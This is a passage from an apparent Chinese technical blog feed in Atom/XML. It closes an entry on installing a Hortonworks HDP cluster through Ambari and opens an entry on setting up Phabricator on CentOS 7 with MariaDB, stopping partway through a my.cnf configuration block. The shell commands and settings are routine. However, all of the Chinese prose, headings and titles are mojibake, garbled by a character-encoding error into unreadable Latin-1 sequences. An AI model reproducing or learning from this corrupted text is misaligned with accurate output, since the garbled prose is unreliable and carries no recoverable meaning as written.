&lt;p&gt;å¦‚æœä¸»æœºæ—è¾¹æœ‰æ˜Ÿå·ï¼Œåˆ™è¯¥ä¸»æœºä¹Ÿè¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ªä¸»ç»„ä»¶ã€‚å°†é¼ æ ‡æ‚¬åœåœ¨æ˜Ÿå·ä¸Šï¼Œä»¥æŸ¥çœ‹è¯¥ä¸»æœºä¸Šçš„å“ªäº›ä¸»ç»„ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ä½¿ç”¨ç‰¹å®šä¸»æœºæ—è¾¹çš„å¤é€‰æ¡†æ¥å¾®è°ƒæ‚¨çš„é€‰æ‹©ã€‚&lt;/p&gt;
&lt;p&gt;å½“ä½ å¯¹ä½ çš„ä½œä¸šæ„Ÿåˆ°æ»¡æ„æ—¶ï¼Œé€‰æ‹©&lt;code&gt;Next&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h3 id=&quot;10-è‡ªå®šä¹‰æœåŠ¡&quot;&gt;&lt;a href=&quot;#10-è‡ªå®šä¹‰æœåŠ¡&quot; class=&quot;headerlink&quot; title=&quot;10.è‡ªå®šä¹‰æœåŠ¡&quot;&gt;&lt;/a&gt;10.è‡ªå®šä¹‰æœåŠ¡&lt;/h3&gt;&lt;p&gt;è‡ªå®šä¹‰æœåŠ¡æ­¥éª¤ä¸ºæ‚¨æä¾›ä¸€ç»„é€‰é¡¹å¡ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹å’Œä¿®æ”¹HDPé›†ç¾¤è®¾ç½®ã€‚å‘å¯¼ä¼šå°è¯•ä¸ºæ¯ä¸ªé€‰é¡¹è®¾ç½®åˆç†çš„é»˜è®¤å€¼ã€‚ä½ æ˜¯å¼ºçƒˆå»ºè®®ï¼Œä»¥æ£€æŸ¥è¿™äº›è®¾ç½®ä¸ºæ‚¨çš„è¦æ±‚å¯èƒ½ç•¥æœ‰ä¸åŒã€‚&lt;/p&gt;
&lt;p&gt;æµè§ˆæ¯ä¸ªæœåŠ¡æ ‡ç­¾ï¼Œç„¶åå°†å…‰æ ‡æ‚¬åœåœ¨æ¯ä¸ªå±æ€§ä¸Šï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å±æ€§åšä»€ä¹ˆçš„ç®€è¦è¯´æ˜ã€‚æ˜¾ç¤ºçš„æœåŠ¡é€‰é¡¹å¡æ•°å–å†³äºæ‚¨å†³å®šåœ¨ç¾¤é›†ä¸­å®‰è£…çš„æœåŠ¡ã€‚ä»»ä½•éœ€è¦è¾“å…¥çš„é€‰é¡¹å¡éƒ½ä¼šæ˜¾ç¤ºä¸€ä¸ªçº¢è‰²å¾½ç« ï¼Œå…¶ä¸­åŒ…å«éœ€è¦æ³¨æ„çš„å±æ€§æ•°ã€‚é€‰æ‹©æ˜¾ç¤ºçº¢è‰²å¾½ç« ç¼–å·çš„æ¯ä¸ªæœåŠ¡é€‰é¡¹å¡ï¼Œç„¶åè¾“å…¥ç›¸åº”çš„ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç›®å½•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HDPå°†å­˜å‚¨ä¿¡æ¯çš„ç›®å½•çš„é€‰æ‹©æ˜¯è‡³å…³é‡è¦çš„ã€‚Ambariå°†å°è¯•æ ¹æ®æ‚¨ç¯å¢ƒä¸­å¯ç”¨çš„å®‰è£…ç‚¹é€‰æ‹©åˆç†çš„é»˜è®¤å€¼ï¼Œä½†å¼ºçƒˆå»ºè®®æ‚¨æŸ¥çœ‹Ambariæ¨èçš„é»˜è®¤ç›®å½•è®¾ç½®ã€‚ç‰¹åˆ«æ˜¯ï¼Œç¡®è®¤ç›®å½•ï¼Œä¾‹å¦‚&lt;code&gt;/tmpå’Œ /var&lt;/code&gt;è¢«ä¸è¢«ç”¨äºä¸‹&lt;code&gt;HDFSçš„NameNode&lt;/code&gt;ç›®å½•å’Œæ•°æ®ç®¡ç†éƒ¨ç›®å½•HDFSæ ‡ç­¾ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¯†ç &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‚¨å¿…é¡»ä¸ºHiveå’ŒOozieæœåŠ¡ä»¥åŠKnoxçš„ä¸»å¯†é’¥æä¾›æ•°æ®åº“å¯†ç ã€‚ä½¿ç”¨Hiveä½œä¸ºç¤ºä¾‹ï¼Œé€‰æ‹©Hiveé€‰é¡¹å¡å¹¶å±•å¼€é«˜çº§éƒ¨åˆ†ã€‚åœ¨ä»¥çº¢è‰²æ ‡è®°çš„æ•°æ®åº“å¯†ç å­—æ®µä¸­ï¼Œæä¾›å¯†ç ï¼Œç„¶åé‡æ–°é”®å…¥ä»¥ç¡®è®¤ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…å„ä¸ªæœåŠ¡ï¼Œå¹¶ä¸”å®Œæˆå®‰è£…åä¼šå¯åŠ¨ç›¸å…³æœåŠ¡ï¼Œå®‰è£…è¿‡ç¨‹æ¯”è¾ƒé•¿ï¼Œå¦‚ä¸­ä¸­å‡ºç°é”™è¯¯ï¼Œæ ¹æ®å…·ä½“æä¾›æˆ–æ—¥å¿—è¿›è¡Œæ“ä½œã€‚ &lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘å°±ä¸è´´å‡ºæ¥äº†ï¼Œå› ä¸ºæµ‹è¯•ç¯å¢ƒæœºå™¨æˆ‘åšæµ‹è¯•ç”¨æœºå™¨é…ç½®ä¸å¤Ÿæ‰€æœ‰åé¢ç»“æœç»éªŒå†™å‡ºæ¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…çš„è¿˜æ˜¯æç¤ºå¤±è´¥ï¼š&lt;code&gt;ImportError: No module named rpm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å‚è€ƒè¿™ç¯‡æ–‡ç« é‡æ–°å®‰è£…è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼š&lt;a href=&quot;http://stackoverflow.com/questions/17490921/no-module-named-rpm-when-i-call-yum-on-shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ImportError: No module named rpm&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;11-å®‰è£…ï¼Œå¯åŠ¨å’Œæµ‹è¯•&quot;&gt;&lt;a href=&quot;#11-å®‰è£…ï¼Œå¯åŠ¨å’Œæµ‹è¯•&quot; class=&quot;headerlink&quot; title=&quot;11.å®‰è£…ï¼Œå¯åŠ¨å’Œæµ‹è¯•&quot;&gt;&lt;/a&gt;11.å®‰è£…ï¼Œå¯åŠ¨å’Œæµ‹è¯•&lt;/h3&gt;&lt;p&gt;å®‰è£…çš„è¿›åº¦å°†æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚Ambariå®‰è£…ï¼Œå¯åŠ¨ï¼Œå¹¶å¯¹æ¯ä¸ªç»„ä»¶è¿è¡Œä¸€ä¸ªç®€å•çš„æµ‹è¯•ã€‚è¿‡ç¨‹çš„æ€»ä½“çŠ¶æ€æ˜¾ç¤ºåœ¨å±å¹•é¡¶éƒ¨çš„è¿›åº¦æ ä¸­ï¼Œä¸»æœºçš„ä¸»æœºçŠ¶æ€æ˜¾ç¤ºåœ¨ä¸»è¦éƒ¨åˆ†ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ä¸è¦åˆ·æ–°æµè§ˆå™¨ã€‚åˆ·æ–°æµè§ˆå™¨å¯èƒ½ä¼šä¸­æ–­è¿›åº¦æŒ‡ç¤ºå™¨ã€‚&lt;/p&gt;
&lt;p&gt;è¦æŸ¥çœ‹æ¯ä¸ªä¸»æœºå·²å®Œæˆçš„ä»»åŠ¡çš„å…·ä½“ä¿¡æ¯ï¼Œè¯·å•å‡»Messageç›¸åº”ä¸»æœºåˆ—ä¸­çš„é“¾æ¥ã€‚åœ¨ Taskså¼¹å‡ºçª—å£ä¸­ï¼Œå•å‡»å•ä¸ªä»»åŠ¡ä»¥æŸ¥çœ‹ç›¸å…³çš„æ—¥å¿—æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨Showä¸‹æ‹‰åˆ—è¡¨é€‰æ‹©è¿‡æ»¤æ¡ä»¶ã€‚è¦æŸ¥çœ‹æ›´å¤§ç‰ˆæœ¬çš„æ—¥å¿—å†…å®¹ï¼Œè¯·å•å‡»Openå›¾æ ‡æˆ–å°†å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œä½¿ç”¨Copyå›¾æ ‡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å®‰è£…å®Œæˆæ•ˆæœå›¾:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari002.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è®©æˆ‘ä»¬ä»å·¦ä¾§æ æˆ–ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©Yarnè¿›å…¥YARNä¿¡æ¯ä¸­å¿ƒã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari004.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æˆ‘ä»¬å°†å¼€å§‹æ›´æ–°çº¿ç¨‹å®¹é‡è°ƒåº¦ç­–ç•¥çš„é…ç½®ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari005.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;å‘ä¸‹æ»šåŠ¨åˆ°&lt;code&gt;Scheduler&lt;/code&gt;é¡µé¢çš„éƒ¨åˆ†ã€‚é»˜è®¤å®¹é‡è°ƒåº¦ç­–ç•¥åªæœ‰ä¸€ä¸ªé˜Ÿåˆ—ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari006.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è®©æˆ‘ä»¬çœ‹çœ‹è°ƒåº¦ç­–ç•¥ã€‚å‘ä¸Šæ»šåŠ¨åˆ°é¡µé¢é¡¶éƒ¨ï¼Œç„¶åç‚¹å‡»å¿«é€Ÿé“¾æ¥ã€‚ç„¶åä»ä¸‹æ‹‰åˆ—è¡¨ä¸­é€‰æ‹©&lt;code&gt;ResourceManager UI&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari007.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ­£å¦‚ä½ å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åªæœ‰é»˜è®¤ç­–ç•¥ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari008.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;å‚è€ƒ&quot;&gt;&lt;a href=&quot;#å‚è€ƒ&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒ&quot;&gt;&lt;/a&gt;å‚è€ƒ&lt;/h3&gt;&lt;p&gt;å®‰è£…Ambariå®˜ç½‘åœ°å€&lt;a href=&quot;https://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-installation/content/download_the_ambari_repo_lnx6.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;install Ambari&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://cwiki.apache.org/confluence/display/AMBARI/Installation+Guide+for+Ambari+2.4.2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ç¼–è¯‘å®‰è£…Ambari 2.4.2å®‰è£…æŒ‡å—&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤&quot;&gt;&lt;a href=&quot;#HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤&quot; class=&quot;headerlink&quot; title=&quot;HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbar
    
    </summary>
    
      <category term="å¤§æ•°æ®" scheme="http://blog.yangcvo.me/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
      <category term="Big data Hadoop" scheme="http://blog.yangcvo.me/tags/Big-data-Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Centos7æ­å»ºé…ç½®phabricatorå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·</title>
    <link href="http://blog.yangcvo.me/2017/01/07/%E8%87%AA%E5%8A%A8%E5%8C%96+%E5%8F%AF%E8%A7%86%E5%8C%96/Phabricator/Centos7%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AEphabricator%E5%BC%80%E6%BA%90%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5%E5%B7%A5%E5%85%B7/"/>
    <id>http://blog.yangcvo.me/2017/01/07/è‡ªåŠ¨åŒ–+å¯è§†åŒ–/Phabricator/Centos7æ­å»ºé…ç½®phabricatorå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·/</id>
    <published>2017-01-07T05:47:27.000Z</published>
    <updated>2017-04-17T09:47:55.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚&quot;&gt;&lt;a href=&quot;#Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚&quot; class=&quot;headerlink&quot; title=&quot;Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚&quot;&gt;&lt;/a&gt;Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚&lt;/h2&gt;&lt;p&gt;å…¬å¸é¡¹ç›®ç®¡ç†å’Œä»£ç å®¡æŸ¥ä¸€ç›´ç”¨&lt;code&gt;jira&lt;/code&gt;å’Œ&lt;code&gt;git&lt;/code&gt;æ¥åš,æœ€è¿‘å‘ç°ä¸€ä¸ªä¸é”™çš„å¼€æºçš„é¡¹ç›®ç®¡ç†å¹³å° è‡ªå·±æ­å»ºä¸‹æ„Ÿè§‰è¿˜æŒºå¥½ç”¨çš„è¯å°±è½¬ç§»è¿‡æ¥äº†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h3&gt;&lt;p&gt;åœ¨Phabricatorä¸­ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„é’ˆå¯¹æ¯ä¸€æ®µä»£ç è¿›è¡Œäº¤é™…è®¨è®º;è´Ÿè´£å®¡æŸ¥çš„å·¥ç¨‹å¸ˆå¯ä»¥æ¥å—ä»£ç æ”¹å˜ï¼Œå¯ä»¥æå‡ºç–‘é—®è¦æ±‚åŸä½œè€…ç»§ç»­ä¿®æ”¹ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Pharbricatorä¸­ï¼Œå¯ä»¥æ–°å»ºä»£ç ä»“åº“ï¼ˆä¹Ÿå°±æ˜¯åœ¨phabricatorä¸­å®¿ä¸»ä»“åº“ï¼‰ï¼Œä¹Ÿå¯ä»¥å¯¼å…¥å¤–éƒ¨ä»“åº“ï¼ˆä»å¤–éƒ¨ä»“åº“æ‹‰å–æ•°æ®ï¼Œå¹¶è·Ÿè¸ªè¯¥å¤–éƒ¨ä»“åº“ä¿æŒæ•°æ®åŒæ­¥ï¼Œphabricatorå†…éƒ¨æœ‰ä¸€ä¸ªæ›´æ–°æœºåˆ¶ï¼‰;æ”¯æŒhttp ï¼Œä¹Ÿæ”¯æŒsshï¼ˆä¸è¿‡é…ç½®æ¯”è¾ƒéº»çƒ¦ç‚¹ï¼‰; Phabricatoræ”¯æŒä¸¤ç§ä»£ç å®¡æŸ¥å·¥ä½œæµï¼šâ€œæäº¤å‰å®¡æŸ¥â€å’Œâ€œauditâ€ï¼ˆæäº¤åå®¡æŸ¥ï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&quot;åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š&quot;&gt;&lt;a href=&quot;#åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š&quot; class=&quot;headerlink&quot; title=&quot;åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š&quot;&gt;&lt;/a&gt;åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;å·®åˆ† - å®¡æŸ¥ä»£ç ï¼šç®¡ç†é¢„æ¨ä»£ç å®¡æŸ¥å·¥ä½œæµç¨‹;&lt;/li&gt;
&lt;li&gt;Maniphest - ä»»åŠ¡å’Œé”™è¯¯ï¼šç®¡ç†æˆå‘˜çš„æ‰€æœ‰ä»»åŠ¡å’ŒBugï¼Œå¯å¯¹ä»»åŠ¡æˆ–Bugå±•å¼€è®¨è®º;&lt;/li&gt;
&lt;li&gt;Diffusion - ä¸»æœºå’Œæµè§ˆå­˜å‚¨åº“ï¼šç®¡ç†ä»£ç ä»“åº“ï¼Œæ”¯æŒGit / Hg / SVN;&lt;/li&gt;
&lt;li&gt;å®¡è®¡ - æµè§ˆå’Œå®¡è®¡æäº¤ï¼šç®¡ç†åæ¨ä»£ç å®¡æŸ¥å·¥ä½œæµç¨‹;&lt;/li&gt;
&lt;li&gt;Phriction - Wikiï¼šæ–‡æ¡£ç®¡ç†;&lt;/li&gt;
&lt;li&gt;é¡¹ç›® - ç»„ç»‡ï¼šå·¥ç¨‹ç®¡ç†ï¼Œå¯å…³è”èµ„æºåº“;&lt;/li&gt;
&lt;li&gt;æºä»£ç æ‰˜ç®¡åœ¨&lt;a href=&quot;https://github.com/phacility/phabricator&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ç‰¹æ€§ï¼š&quot;&gt;&lt;a href=&quot;#ç‰¹æ€§ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç‰¹æ€§ï¼š&quot;&gt;&lt;/a&gt;ç‰¹æ€§ï¼š&lt;/h3&gt;&lt;p&gt;ä»£ç å®¡æŸ¥ï¼ˆCode Reviewï¼‰&lt;br&gt;gitä»“åº“&lt;br&gt;è·Ÿè¸ªbug&lt;br&gt;é¡¹ç›®ç®¡ç†&lt;br&gt;å›¢é˜Ÿæ²Ÿé€š&lt;/p&gt;
&lt;p&gt;å…³äºphabricatoræ›´å¤šçš„ä»‹ç»ï¼Œè®¿é—®é¡¹ç›®å®˜ç½‘ï¼š&lt;a href=&quot;httpsï¼š//secure.phabricator.com/book/phabricator/article/introduction/&quot;&gt;phabricator&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ç¯å¢ƒè¦æ±‚ï¼š&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒè¦æ±‚ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒè¦æ±‚ï¼š&quot;&gt;&lt;/a&gt;ç¯å¢ƒè¦æ±‚ï¼š&lt;/h3&gt;&lt;p&gt;Phabricatoræ˜¯ä¸€ä¸ªLAMPåº”ç”¨å¥—ä»¶ï¼Œå› æ­¤æœ€åŸºæœ¬çš„è¦æ±‚å°±æ˜¯LAMPç¯å¢ƒï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* Linuxç³»ç»Ÿç¯å¢ƒï¼šcentos7.1 64ä½&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Apacheï¼ˆæˆ–nginxï¼Œæˆ–lighttpdï¼‰ï¼šéœ€è¦Apache 2.2.7ä»¥ä¸Šç‰ˆæœ¬ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* MySQLï¼šMySQLå¿…éœ€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* PHPï¼šéœ€è¦PHP5.2ä»¥ä¸Šç‰ˆæœ¬&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è¿™é‡Œæˆ‘å®‰è£…ç‰ˆæœ¬ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Apache 2.2.15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* mysql 5.6.29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* php 5.4.16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;phabricatorå®‰è£…&quot;&gt;&lt;a href=&quot;#phabricatorå®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;phabricatorå®‰è£…&quot;&gt;&lt;/a&gt;phabricatorå®‰è£…&lt;/h3&gt;&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https : //secure.phabricator.com/book/phabricator/article/installation_guide/&quot;&gt;å®˜ç½‘phabricatorå®‰è£…&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å…·ä½“è¿‡ç¨‹ä¸æè¿°ï¼Œä»¥æˆ‘å‚è€ƒçš„ç½‘ç»œèµ„æºè¿›è¡Œè¯´æ˜ã€‚ç½‘ä¸Šçš„èµ„æºå‚è€ƒäº†ç‰¹åˆ«å¤šï¼Œåªæ”¾æˆ‘è®¤ä¸ºæœ€æœ‰å¸®åŠ©çš„ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆï¼Œ&lt;code&gt;phabricator&lt;/code&gt;æ˜¯åŸºäºphpçš„ï¼ŒåŒæ—¶éœ€è¦å‘é€é‚®ä»¶ï¼ˆæé†’ä»£ç å®¡æŸ¥è€…ï¼‰ï¼Œæ‰€ä»¥å‡å®šæœåŠ¡å™¨ä¸Šå·²ç»é…ç½®å¥½äº†&lt;code&gt;phpï¼Œmysqlï¼Œnginxï¼Œpostfix&lt;/code&gt;ç­‰ç¯å¢ƒ;åŒæ—¶ï¼Œå®˜æ–¹æ¨èå¼€å¯APCæ€§èƒ½.&lt;/p&gt;
&lt;p&gt;###1 å®‰è£…MariaDBæ•°æ®åº“&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install mariadb mariadb-server&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯åŠ¨MariadbæœåŠ¡ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systemctl start mariadb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;built_in&quot;&gt;enable&lt;/span&gt; mariadb&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿è¡ŒMySQLåˆå§‹åŒ–å®‰è£…è„šæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mysql_secure_installation&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é»˜è®¤å¯†ç ä¸ºç©ºã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œéœ€è¦é…ç½®ä¼˜åŒ–my.cnf å¦‚æœé»˜è®¤ä¸ä¼˜åŒ–ä¹Ÿæ˜¯å¯ä»¥çš„ä¸è¿‡å®‰è£…å®Œæˆä»¥åå¯ä»¥çœ‹åˆ°æˆ‘ä¸‹é¢æ–‡ç« ä¼šå‡ºç°10å¤šä¸ªé—®é¢˜ å¤§éƒ¨åˆ†éƒ½æ˜¯è·ŸMySQLç›¸å…³çš„ã€‚&lt;/p&gt;
&lt;h5 id=&quot;é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š&quot;&gt;&lt;a href=&quot;#é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š&quot;&gt;&lt;/a&gt;é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim /etc/my.cnf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[mysqld]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;innodb_buffer_pool_size = 1600M&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;max_allowed_packet = &lt;span class=&quot;string&quot;&gt;&quot;33554432&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sql_mode=STRICT_ALL_TABLES&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ft_stopword_file=/var/www/html/phabricator/resources/sql/stopwords.txt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ft_min_word_len = 3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
